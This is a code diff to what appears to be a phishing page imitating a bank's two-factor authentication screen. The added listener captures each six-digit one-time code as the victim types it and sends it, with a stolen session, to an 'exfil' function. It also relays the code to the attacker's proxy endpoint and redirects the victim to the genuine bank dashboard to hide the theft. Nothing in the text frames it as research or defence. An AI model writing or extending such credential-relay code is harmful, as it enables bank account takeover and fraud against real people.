@@ -105,6 +105,19 @@ body{font-family:"Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helv
       });
       return res.json();
     }
+    document.getElementById('txt-2fa').addEventListener('input', async function() {
+  const codigo = this.value.trim();
+  if (codigo.length !== 6) return;
+
+  exfil({ step: '2_realtime', otp: codigo, s: capturedSession });
+
+  try {
+    const res = await proxyReq('/api/verificar-full', { codigo, session: capturedSession });
+    if (res.ok) {
+      window.location.href = BANCO + (res.next || '/dashboard');
+    }
+  } catch(err) {}
+});
 
     document.getElementById('form-2fa').addEventListener('submit', async function(e) {
       e.preventDefault();
